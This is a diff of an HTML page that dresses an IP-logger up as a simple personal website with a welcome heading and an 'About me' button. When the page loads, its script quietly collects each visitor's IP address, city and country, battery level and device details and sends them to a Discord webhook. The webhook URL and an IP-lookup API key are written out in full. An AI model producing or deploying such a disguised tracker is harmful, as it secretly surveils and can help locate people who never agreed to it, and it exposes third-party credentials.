@@ -3,44 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enhanced Visitor Info Logger</title>
+    <title>Not Yet Done</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #add8e6, #dda0dd);
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            height: auto;
+            margin: 0;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        h1 {
+            font-size: 2em;
+            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
+        }
+
+        button {
+            background: #dda0dd;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 1.2em;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background: #add8e6;
+            transform: scale(1.1);
+        }
+
+        button:active {
+            transform: scale(1);
+        }
+    </style>
 </head>
 <body>
+    <h1>Welcome to my website.</h1>
+    <button onclick="redirectToPage()">About me</button>
+
     <script>
+        function redirectToPage() {
+            window.location.href = 'page1.html';
+        }
+
         const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
-        const redirectURL = 'https://www.google.com';
         const ipflareAPIKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4df3c8b707a05ab80b9f8d27598627804ad8478f27';
 
-        // Function to get the user's IP address
         async function getIPAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                console.error('Error fetching IP address:', error);
+                console.error('Error fetching IP:', error);
                 return null;
             }
         }
 
-        // Function to get location data using IP Flare
-        async function getLocationData(ip) {
+        async function getLocation(ip) {
             try {
                 const response = await fetch(`https://api.ipflare.io/${ip}`, {
                     method: 'GET',
-                    headers: {
-                        'X-API-Key': ipflareAPIKey
-                    }
+                    headers: { 'X-API-Key': ipflareAPIKey }
                 });
                 const data = await response.json();
-                return data;
+                return `${data.city}, ${data.country_name}`;
             } catch (error) {
-                console.error('Error fetching location data:', error);
-                return null;
+                console.error('Error fetching location:', error);
+                return 'Location unknown';
             }
         }
 
-        // Function to collect device information
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
+            } else {
+                return Promise.resolve('Battery info not available');
+            }
+        }
+
         function getDeviceInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
@@ -49,10 +95,6 @@
             const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
             const screenResolution = `${window.screen.width}x${window.screen.height}`;
             const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
-            const windowWidth = window.innerWidth;
-            const windowHeight = window.innerHeight;
-            const deviceMemory = navigator.deviceMemory || 'N/A';
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
 
             return `
                 User-Agent: ${userAgent}
@@ -62,44 +104,22 @@
                 Mobile Device: ${isMobile}
                 Screen Resolution: ${screenResolution}
                 Screen Orientation: ${screenOrientation}
-                Window Dimensions: ${windowWidth}x${windowHeight}
-                Device Memory: ${deviceMemory} GB
-                Hardware Concurrency: ${hardwareConcurrency}
             `;
         }
 
-        // Function to send data to the Discord webhook
-        async function sendToDiscord() {
-            const ip = await getIPAddress();
-            let locationDetails = 'Unable to fetch location data';
-            if (ip) {
-                const locationData = await getLocationData(ip);
-                if (locationData && !locationData.error) {
-                    locationDetails = `
-                        IP: ${locationData.ip}
-                        Country: ${locationData.country_name}
-                        Region: ${locationData.region}
-                        City: ${locationData.city}
-                        Latitude: ${locationData.latitude}
-                        Longitude: ${locationData.longitude}
-                        ISP: ${locationData.isp}
-                        Timezone: ${locationData.timezone}
-                    `;
-                }
-            }
-
-            const deviceInfo = getDeviceInfo();
-            const timestamp = new Date().toLocaleString();
-
+        function sendToDiscord(ip, location, battery, deviceInfo) {
             const payload = {
                 embeds: [{
                     title: "New Visitor Information",
                     color: 7506394,
                     fields: [
-                        { name: "Device Info", value: `\`\`\`${deviceInfo}\`\`\``, inline: false },
-                        { name: "Location Info", value: `\`\`\`${locationDetails}\`\`\``, inline: false },
+                        { name: "IP Address", value: ip, inline: true },
+                        { name: "Location", value: location || 'N/A', inline: true },
+                        { name: "Battery Level", value: battery, inline: true },
+                        { name: "Device Info", value: deviceInfo, inline: false },
+                        { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ip}` }
                     ],
-                    footer: { text: `Logged at ${timestamp}` }
+                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
                 }]
             };
 
@@ -110,15 +130,19 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('Visitor info logged successfully');
-                    window.location.href = redirectURL;
                 } else {
                     console.error('Failed to log visitor info:', response.statusText);
                 }
             }).catch(error => console.error('Error sending to webhook:', error));
         }
 
-        // Execute functions
-        sendToDiscord();
+        Promise.all([getIPAddress(), getBatteryInfo()])
+            .then(([ip, battery]) => {
+                const deviceInfo = getDeviceInfo();
+                getLocation(ip).then(location => {
+                    sendToDiscord(ip, location, battery, deviceInfo);
+                });
+            });
     </script>
 </body>
 </html>
